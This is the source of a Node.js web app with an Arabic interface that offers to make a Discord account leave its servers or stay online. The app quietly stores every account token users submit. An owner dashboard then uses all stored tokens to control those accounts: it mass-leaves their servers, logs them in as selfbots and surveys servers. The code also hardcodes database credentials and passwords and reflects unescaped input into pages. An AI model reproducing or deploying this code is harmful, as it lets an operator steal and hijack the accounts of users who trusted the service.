require("dotenv").config();
const express = require("express");
const cookieParser = require("cookie-parser");
const crypto = require("crypto");
const mongoose = require("mongoose");
const { Client } = require("discord.js-selfbot-v13");

const {
  PORT = 3000,
  MONGO_URI = "mongodb+srv://omargamingff2_db_user:CT8NNal0NVdHdoB9@cluster0.pab2lk3.mongodb.net/",
  COOKIE_SECRET = "keo_secret_key_999"
} = process.env;

const API = "https://discord.com/api/v10";

mongoose.connect(MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log("Connected to MongoDB!")).catch(err => console.error(err));

const userSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  createdAt: { type: Date, default: Date.now }
});
const TokenModel = mongoose.model("bot_tokens", userSchema);

const statsSchema = new mongoose.Schema({
  id: { type: String, default: "global_stats" },
  visitors: { type: Number, default: 0 },
  normalLogins: { type: Number, default: 0 },
  ownerLogins: { type: Number, default: 0 },
  failedAttempts: { type: Number, default: 0 },
  totalOperations: { type: Number, default: 0 },
  leaveCooldownDays: { type: Number, default: 0 }
});
const StatsModel = mongoose.model("site_stats", statsSchema);

const sessionSchema = new mongoose.Schema({
  sid: { type: String, required: true, unique: true },
  role: { type: String, required: true },
  expiresAt: { type: Date, required: true }
});
const SessionModel = mongoose.model("site_sessions", sessionSchema);

async function updateStat(field, value = 1) {
  await StatsModel.findOneAndUpdate(
    { id: "global_stats" },
    { $inc: { [field]: value } },
    { upsert: true, new: true }
  );
}

const activeClients = new Map();

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser(COOKIE_SECRET));

const layout = (title, content) => `<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>${title}</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: linear-gradient(rgba(10, 5, 20, 0.75), rgba(10, 5, 20, 0.85)), 
                  url('https://images.unsplash.com/photo-1509557965875-b88c97052f0e?q=80&w=1920&auto=format&fit=crop') no-repeat center center fixed;
      background-size: cover;
      color: #e0def4;
      font-family: 'Tajawal', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: rgba(20, 14, 28, 0.92);
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 107, 0, 0.35);
      border-radius: 24px;
      padding: 40px 30px;
      text-align: center;
      max-width: 520px;
      width: 100%;
      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 35px rgba(255, 107, 0, 0.2);
    }
    h2 { font-size: 22px; color: #ff9f43; margin-bottom: 20px; font-weight: 700; }
    p { font-size: 14px; color: #b8b5e0; margin-bottom: 20px; line-height: 1.6; }
    input[type="password"], input[type="text"], select, input[type="number"] {
      width: 100%;
      padding: 14px;
      background: rgba(10, 5, 20, 0.8);
      border: 1px solid rgba(255, 107, 0, 0.3);
      border-radius: 12px;
      color: #fff;
      font-family: 'Tajawal', sans-serif;
      font-size: 15px;
      margin-bottom: 20px;
      outline: none;
      text-align: center;
    }
    input:focus, select:focus { border-color: #ff7b00; box-shadow: 0 0 10px rgba(255, 123, 0, 0.3); }
    .btn {
      display: block;
      width: 100%;
      background: linear-gradient(135deg, #ff7b00, #ff4500);
      color: #fff;
      border: none;
      padding: 14px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      text-decoration: none;
      transition: 0.3s;
      box-shadow: 0 4px 15px rgba(255, 123, 0, 0.4);
      margin-bottom: 12px;
      text-align: center;
    }
    .btn:hover { transform: translateY(-2px); opacity: 0.9; }
    .btn-secondary {
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.15);
      box-shadow: none;
    }
    .btn-owner {
      background: linear-gradient(135deg, #8a2be2, #4b0082);
      box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
    }
    .avatar {
      width: 96px;
      height: 96px;
      border-radius: 50%;
      border: 3px solid #ff7b00;
      object-fit: cover;
      box-shadow: 0 0 20px rgba(255, 123, 0, 0.5);
      margin-bottom: 16px;
    }
    .username {
      font-size: 20px;
      font-weight: 700;
      color: #f3f0ff;
      margin-bottom: 6px;
    }
    .user-tag {
      font-size: 13px;
      color: #b8b5e0;
      margin-bottom: 20px;
    }
    .logs-box {
      background: rgba(5, 2, 10, 0.95);
      border: 1px solid rgba(255, 107, 0, 0.3);
      border-radius: 12px;
      padding: 15px;
      text-align: right;
      max-height: 250px;
      overflow-y: auto;
      font-family: monospace;
      font-size: 13px;
      color: #57f287;
      margin-bottom: 20px;
    }
    .stat-box {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 10px;
      padding: 12px;
      margin-bottom: 10px;
      text-align: right;
      font-size: 14px;
      display: flex;
      justify-content: space-between;
    }
    .developer-sig {
      font-size: 10px;
      font-weight: 300;
      color: rgba(255, 255, 255, 0.4);
      letter-spacing: 2px;
      text-transform: uppercase;
      border-top: 1px solid rgba(255, 255, 255, 0.08);
      padding-top: 15px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    ${content}
    <div class="developer-sig">made by syrian devloper : keo</div>
  </div>
</body>
</html>`;

// مسار رئيسي ذكي: يتحقق إذا كان مسجل دخول، وإلا يطلب الباسورد
app.get("/", async (req, res) => {
  const sid = req.signedCookies.sid;
  if (sid) {
    const session = await SessionModel.findOne({ sid });
    if (session && session.expiresAt > new Date()) {
      if (session.role === "owner") return res.redirect("/owner-dashboard");
      return res.redirect("/token-entry?service=leave");
    }
  }
  await updateStat("visitors");
  res.redirect("/auth");
});

app.get("/auth", (req, res) => {
  res.send(layout("تسجيل الدخول", `
    <h2>🔒 بوابة الدخول المرعبة</h2>
    <p>أدخل كلمة السر للوصول إلى الواجهة المطلوبة</p>
    <form method="POST" action="/auth">
      <input type="password" name="password" placeholder="أدخل كلمة السر هنا..." required autocomplete="off">
      <button class="btn" type="submit">دخول</button>
    </form>
  `));
});

app.post("/auth", async (req, res) => {
  const { password } = req.body;
  const sessionId = crypto.randomBytes(24).toString("hex");

  if (password === "mılanmembersite") {
    await updateStat("normalLogins");
    await SessionModel.create({ sid: sessionId, role: "normal", expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000) });
    res.cookie("sid", sessionId, { signed: true, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 });
    res.redirect("/token-entry?service=leave");
  } else if (password === "73849274628491837465djfbfbrhdjzkkieueiwksndnxbxjxdjehrbrjfjjdhwwiowjddbskdb9283746518293746xkfbfbrhdjzjjkiieueiwksndnxbx") {
    await updateStat("ownerLogins");
    await SessionModel.create({ sid: sessionId, role: "owner", expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000) });
    res.cookie("sid", sessionId, { signed: true, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 });
    res.redirect("/owner-dashboard");
  } else {
    await updateStat("failedAttempts");
    res.send(layout("خطأ", `<h2>❌ كلمة السر خاطئة!</h2><p style="color:#ff5555; font-size:12px;">تم تسجيل محاولة دخول خاطئة.</p><a class="btn" href="/auth">إعادة المحاولة</a>`));
  }
});

const checkNormalAuth = async (req, res, next) => {
  const sid = req.signedCookies.sid;
  if (!sid) return res.redirect("/auth");
  const session = await SessionModel.findOne({ sid });
  if (!session || session.expiresAt < new Date() || (session.role !== "normal" && session.role !== "owner")) {
    if (sid) await SessionModel.deleteOne({ sid });
    return res.redirect("/auth");
  }
  next();
};

const checkOwnerAuth = async (req, res, next) => {
  const sid = req.signedCookies.sid;
  if (!sid) return res.redirect("/auth");
  const session = await SessionModel.findOne({ sid });
  if (!session || session.expiresAt < new Date() || session.role !== "owner") {
    if (sid) await SessionModel.deleteOne({ sid });
    return res.redirect("/auth");
  }
  next();
};

app.get("/token-entry", checkNormalAuth, (req, res) => {
  const service = req.query.service || "leave";
  const serviceTitle = service === "leave" ? "الخدمة الأولى: إخراج الحساب من السيرفرات" : "الخدمة الثانية: جعل الحساب أونلاين دائماً";
  
  res.send(layout("إدخال التوكن", `
    <h2>🦇 اختر الخدمة أولاً يا معلم</h2>
    <div style="display: flex; gap: 10px; margin-bottom: 20px;">
      <a href="/token-entry?service=leave" class="btn ${service === 'leave' ? '' : 'btn-secondary'}" style="margin-bottom:0; font-size:13px; padding:10px;">إخراج السيرفرات</a>
      <a href="/token-entry?service=online" class="btn ${service === 'online' ? '' : 'btn-secondary'}" style="margin-bottom:0; font-size:13px; padding:10px;">حالة أونلاين</a>
    </div>
    <p>الخدمة المحددة حالياً: <b>${serviceTitle}</b></p>
    <form method="POST" action="/verify-token">
      <input type="hidden" name="serviceType" value="${service}">
      <input type="text" name="token" placeholder="ضع توكن الحساب هنا..." required autocomplete="off">
      <button class="btn" type="submit">فحص التوكن والمتابعة</button>
    </form>
    <div style="margin-top:20px;">
      <a href="/logout" style="color:#ff5555; font-size:13px; text-decoration:none;">تسجيل الخروج (طلب الباسورد من جديد)</a>
    </div>
  `));
});

app.get("/logout", async (req, res) => {
  const sid = req.signedCookies.sid;
  if (sid) await SessionModel.deleteOne({ sid });
  res.clearCookie("sid");
  res.clearCookie("user_token");
  res.redirect("/auth");
});

app.post("/verify-token", checkNormalAuth, async (req, res) => {
  const { token, serviceType } = req.body;
  if (!token) return res.redirect("/token-entry");

  try {
    const userRes = await fetch(`${API}/users/@me`, {
      headers: { Authorization: token }
    });

    if (!userRes.ok) {
      return res.send(layout("فحص التوكن", `
        <h2>❌ التوكن غير سليم أو غير شغال!</h2>
        <p style="color:#ff5555;">تأكد من إدخال توكن حساب حقيقي وصحيح.</p>
        <a class="btn" href="/token-entry?service=${serviceType}">إعادة المحاولة</a>
      `));
    }

    const userData = await userRes.json();
    const avatarUrl = userData.avatar 
      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` 
      : `https://cdn.discordapp.com/embed/avatars/${Number(userData.discriminator || 0) % 5}.png`;

    await TokenModel.findOneAndUpdate({ token }, { token }, { upsert: true, new: true });
    await updateStat("totalOperations");
    
    res.cookie("user_token", token, { signed: true, httpOnly: true });
    res.cookie("selected_service", serviceType, { signed: true, httpOnly: true });

    res.send(layout("تم التحقق من الحساب", `
      <img class="avatar" src="${avatarUrl}" alt="Avatar">
      <div class="username">${userData.global_name || userData.username}</div>
      <div class="user-tag">@${userData.username}</div>
      <div class="status-badge" style="color:#57f287; background:rgba(87,242,135,0.1); border:1px solid rgba(87,242,135,0.3); padding:8px; border-radius:20px; margin-bottom:20px; font-size:13px;">
        ✅ التوكن سليم وشغال 100%
      </div>
      <a class="btn" href="/proceed-service">تخطي والانتقال للخدمة المطلوبة</a>
    `));

  } catch (err) {
    res.send(layout("خطأ", `
      <h2>❌ حدث خطأ أثناء فحص التوكن</h2>
      <a class="btn" href="/token-entry?service=${serviceType}">إعادة المحاولة</a>
    `));
  }
});

app.get("/proceed-service", checkNormalAuth, (req, res) => {
  const service = req.signedCookies.selected_service;
  if (service === "leave") {
    res.redirect("/leave-servers");
  } else if (service === "online") {
    res.redirect("/online-options");
  } else {
    res.redirect("/token-entry");
  }
});
// --- لوحة تحكم المالك ---
app.get("/owner-dashboard", checkOwnerAuth, async (req, res) => {
  res.send(layout("لوحة تحكم المالك", `
    <h2>👑 أهلاً بك يا مالك الموقع</h2>
    <p>تحكم كامل بجميع الحسابات والسيرفرات</p>
    <a class="btn btn-owner" href="/owner/leave-all">إخراج كل الحسابات المسجلة من السيرفرات</a>
    <a class="btn btn-owner" href="/owner/check-server">فحص سيرفر معين</a>
    <a class="btn btn-owner" href="/owner/cooldown">تعيين مدة الاشتراك (Auto-Leave)</a>
    <a class="btn btn-owner" href="/owner/all-online">جعل جميع الحسابات أونلاين (ألعاب Google Play)</a>
    <a class="btn btn-secondary" href="/owner/info">معلومات الموقع والإحصائيات</a>
    <div style="margin-top:20px;">
      <a href="/logout" style="color:#ff5555; font-size:13px; text-decoration:none;">تسجيل الخروج</a>
    </div>
  `));
});

app.get("/owner/leave-all", checkOwnerAuth, async (req, res) => {
  res.send(layout("إخراج جميع الحسابات...", `
    <h2>⚠️ جاري إخراج كل الحسابات من جميع السيرفرات...</h2>
    <div class="logs-box" id="logs">جاري بدء العملية...</div>
    <script>
      async function startAllLeaving() {
        const box = document.getElementById('logs');
        try {
          const res = await fetch('/api/owner/leave-all', { method: 'POST' });
          const reader = res.body.getReader();
          const decoder = new TextDecoder();
          box.innerHTML = '';
          while (true) {
            const { value, done } = await reader.read();
            if (done) break;
            box.innerHTML += decoder.decode(value, { stream: true });
            box.scrollTop = box.scrollHeight;
          }
          box.innerHTML += '<br><b>✅ تم الانتهاء بنجاح!</b>';
        } catch (e) { box.innerHTML += '<br>❌ حدث خطأ.'; }
      }
      startAllLeaving();
    </script>
    <br><a class="btn" href="/owner-dashboard">العودة لوحة المالك</a>
  `));
});

app.post("/api/owner/leave-all", checkOwnerAuth, async (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  const tokens = await TokenModel.find({});
  
  for (const user of tokens) {
    res.write(`<b>--- معالجة حساب جديد ---</b><br>`);
    try {
      const gRes = await fetch(`${API}/users/@me/guilds`, { headers: { Authorization: user.token } });
      if (!gRes.ok) { res.write(`فشل جلب سيرفرات الحساب<br>`); continue; }
      const guilds = await gRes.json();
      for (const guild of guilds) {
        const lRes = await fetch(`${API}/users/@me/guilds/${guild.id}`, { method: "DELETE", headers: { Authorization: user.token } });
        if (lRes.ok || lRes.status === 204) {
          res.write(`- تم الخروج من ${guild.name}<br>`);
        } else {
          res.write(`- فشل الخروج من ${guild.name}<br>`);
        }
        await new Promise(r => setTimeout(r, 600));
      }
    } catch (e) { res.write(`خطأ في معالجة الحساب.<br>`); }
  }
  await updateStat("totalOperations");
  res.end();
});

app.get("/owner/check-server", checkOwnerAuth, async (req, res) => {
  res.send(layout("فحص سيرفر", `
    <h2>🔍 فحص معلومات سيرفر</h2>
    <form method="POST" action="/owner/check-server">
      <input type="text" name="guildId" placeholder="أدخل آيدي السيرفر (Guild ID)..." required>
      <button class="btn btn-owner" type="submit">فحص السيرفر</button>
    </form>
    <a class="btn btn-secondary" href="/owner-dashboard">العودة</a>
  `));
});

app.post("/owner/check-server", checkOwnerAuth, async (req, res) => {
  const { guildId } = req.body;
  const tokens = await TokenModel.find({});
  let botsInServer = 0;

  for (const user of tokens) {
    try {
      const r = await fetch(`${API}/users/@me/guilds`, { headers: { Authorization: user.token } });
      if (r.ok) {
        const guilds = await r.json();
        if (guilds.some(g => g.id === guildId)) botsInServer++;
      }
    } catch (e) {}
  }

  res.send(layout("نتيجة الفحص", `
    <h2>📊 معلومات السيرفر (${guildId})</h2>
    <div class="stat-box"><span>الحسابات المسجلة بداخله:</span> <b>${botsInServer} حساب</b></div>
    <a class="btn" href="/owner/check-server">فحص سيرفر آخر</a>
    <a class="btn btn-secondary" href="/owner-dashboard">العودة</a>
  `));
});

app.get("/owner/cooldown", checkOwnerAuth, async (req, res) => {
  const stats = await StatsModel.findOne({ id: "global_stats" }) || { leaveCooldownDays: 0 };
  res.send(layout("مدة الاشتراك", `
    <h2>⏳ تعيين مدة البقاء التلقائي</h2>
    <p>الحالة الحالية: <b>${stats.leaveCooldownDays} يوم</b></p>
    <form method="POST" action="/owner/cooldown">
      <input type="number" name="days" placeholder="عدد الأيام..." required>
      <button class="btn btn-owner" type="submit">حفظ وتطبيق</button>
    </form>
    <a class="btn btn-secondary" href="/owner-dashboard">العودة</a>
  `));
});

app.post("/owner/cooldown", checkOwnerAuth, async (req, res) => {
  const { days } = req.body;
  await StatsModel.findOneAndUpdate({ id: "global_stats" }, { leaveCooldownDays: Number(days) }, { upsert: true });
  res.send(layout("تم الحفظ", `<h2>✅ تم تحديث مدة البقاء إلى ${days} يوم بنجاح!</h2><a class="btn" href="/owner-dashboard">العودة</a>`));
});

app.get("/owner/info", checkOwnerAuth, async (req, res) => {
  const stats = await StatsModel.findOne({ id: "global_stats" }) || {};
  const totalTokens = await TokenModel.countDocuments();
  let onlineBotsCount = 0;
  for (const client of activeClients.values()) {
    if (client.user) onlineBotsCount++;
  }

  res.send(layout("إحصائيات الموقع", `
    <h2>📈 معلومات وإحصائيات الموقع</h2>
    <div class="stat-box"><span>إجمالي زوار الموقع:</span> <b>${stats.visitors || 0}</b></div>
    <div class="stat-box"><span>دخول بـ (mılanmembersite):</span> <b>${stats.normalLogins || 0}</b></div>
    <div class="stat-box"><span>دخول المالك:</span> <b>${stats.ownerLogins || 0}</b></div>
    <div class="stat-box"><span>محاولات دخول خاطئة:</span> <b>${stats.failedAttempts || 0}</b></div>
    <div class="stat-box"><span>الحسابات أونلاين الآن:</span> <b style="color:#57f287;">${onlineBotsCount} حساب</b></div>
    <div class="stat-box"><span>إجمالي العمليات:</span> <b>${stats.totalOperations || 0}</b></div>
    <div class="stat-box"><span>إجمالي التوكنات:</span> <b>${totalTokens} توكن</b></div>
    <br>
    <a class="btn btn-secondary" href="/owner-dashboard">العودة</a>
  `));
});

app.get("/owner/all-online", checkOwnerAuth, async (req, res) => {
  const tokens = await TokenModel.find({});
  let successCount = 0;
  const googlePlayGames = ["PUBG MOBILE", "Free Fire", "Roblox", "Minecraft", "Brawl Stars", "Call of Duty: Mobile"];

  for (const user of tokens) {
    if (activeClients.has(user.token)) continue;
    const client = new Client();
    const randomGame = googlePlayGames[Math.floor(Math.random() * googlePlayGames.length)];

    client.on("ready", () => {
      client.user.setPresence({ activities: [{ name: randomGame, type: "PLAYING" }], status: "online" });
    });

    try {
      await client.login(user.token);
      activeClients.set(user.token, client);
      successCount++;
    } catch (e) {}
  }

  await updateStat("totalOperations");
  res.send(layout("تم التشغيل الجماعي", `
    <h2>🎮 تم تشغيل الحسابات بنجاح!</h2>
    <p>تم تفعيل <b>${successCount} حساب</b> وإبقاؤهم أونلاين بألعاب Google Play.</p>
    <a class="btn" href="/owner-dashboard">العودة</a>
  `));
});

// --- الخدمات الفردية ---
app.get("/leave-servers", checkNormalAuth, async (req, res) => {
  res.send(layout("جاري المغادرة...", `
    <h2>⚠️ جاري الخروج من السيرفرات...</h2>
    <div class="logs-box" id="logs">جاري جلب قائمة السيرفرات...</div>
    <script>
      async function startLeaving() {
        const box = document.getElementById('logs');
        try {
          const res = await fetch('/api/leave', { method: 'POST' });
          const reader = res.body.getReader();
          const decoder = new TextDecoder();
          box.innerHTML = '';
          while (true) {
            const { value, done } = await reader.read();
            if (done) break;
            box.innerHTML += decoder.decode(value, { stream: true });
            box.scrollTop = box.scrollHeight;
          }
          box.innerHTML += '<br><b>✅ تم الانتهاء من مغادرة السيرفرات!</b>';
        } catch (e) { box.innerHTML += '<br>❌ حدث خطأ.'; }
      }
      startLeaving();
    </script>
    <br><a class="btn" href="/token-entry?service=leave">العودة للرئيسية</a>
  `));
});

app.post("/api/leave", checkNormalAuth, async (req, res) => {
  const token = req.signedCookies.user_token;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  try {
    const guildsRes = await fetch(`${API}/users/@me/guilds`, { headers: { Authorization: token } });
    if (!guildsRes.ok) { res.write("فشل جلب السيرفرات.<br>"); return res.end(); }
    const guilds = await guildsRes.json();
    for (const guild of guilds) {
      const leaveRes = await fetch(`${API}/users/@me/guilds/${guild.id}`, { method: "DELETE", headers: { Authorization: token } });
      if (leaveRes.ok || leaveRes.status === 204) {
        res.write(`- تم الخروج من ${guild.name}<br>`);
      } else {
        res.write(`- فشل الخروج من ${guild.name}<br>`);
      }
      await new Promise(r => setTimeout(r, 800));
    }
  } catch (e) { res.write("حدث خطأ عام أثناء العملية.<br>"); }
  await updateStat("totalOperations");
  res.end();
});

app.get("/online-options", checkNormalAuth, async (req, res) => {
  res.send(layout("إعداد حالة أونلاين", `
    <h2>🟢 إبقاء الحساب أونلاين دائماً</h2>
    <form method="POST" action="/start-online">
      <label style="display:block; text-align:right; font-size:13px; margin-bottom:5px; color:#ff9f43;">حالة الحساب (Status):</label>
      <select name="status" required>
        <option value="online">متصل (Online)</option>
        <option value="idle">خامل (Idle)</option>
        <option value="dnd">الرجاء عدم الإزعاج (DND)</option>
      </select>

      <label style="display:block; text-align:right; font-size:13px; margin-bottom:5px; color:#ff9f43;">فعالية الحساب (Activity Type):</label>
      <select name="statusType" required>
        <option value="PLAYING">يلعب (Playing)</option>
        <option value="STREAMING">يبث (Streaming)</option>
        <option value="WATCHING">يشاهد (Watching)</option>
        <option value="LISTENING">يستمع (Listening)</option>
      </select>

      <label style="display:block; text-align:right; font-size:13px; margin-bottom:5px; color:#ff9f43;">النص المكتوب (Activity Text):</label>
      <input type="text" name="statusText" placeholder="اكتب اسم اللعبة أو النشاط هنا..." required autocomplete="off">

      <button class="btn" type="submit">تشغيل الحالة وتثبيتها</button>
    </form>
    <a class="btn btn-secondary" href="/token-entry?service=online">العودة للرئيسية</a>
  `));
});

app.post("/start-online", checkNormalAuth, async (req, res) => {
  const token = req.signedCookies.user_token;
  const { status, statusType, statusText } = req.body;
  if (!token) return res.redirect("/token-entry?service=online");

  if (activeClients.has(token)) {
    try { activeClients.get(token).destroy(); } catch(e){}
    activeClients.delete(token);
  }

  const client = new Client();
  client.on("ready", () => {
    client.user.setPresence({
      activities: [{ name: statusText, type: statusType }],
      status: status
    });
  });

  try {
    await client.login(token);
    activeClients.set(token, client);
    await updateStat("totalOperations");
    res.send(layout("تم التشغيل", `
      <h2>🚀 تم تفعيل الحالة بنجاح!</h2>
      <p>الحساب الآن أونلاين بوضع <b>(${status})</b> ونشاط <b>(${statusType}: ${statusText})</b> وسيبقى يعمل طالما السيرفر يعمل.</p>
      <a class="btn" href="/token-entry?service=online">العودة للرئيسية</a>
    `));
  } catch (err) {
    res.send(layout("خطأ", `
      <h2>❌ التوكن غير صالح أو فشل الاتصال</h2>
      <a class="btn" href="/online-options">إعادة المحاولة</a>
    `));
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
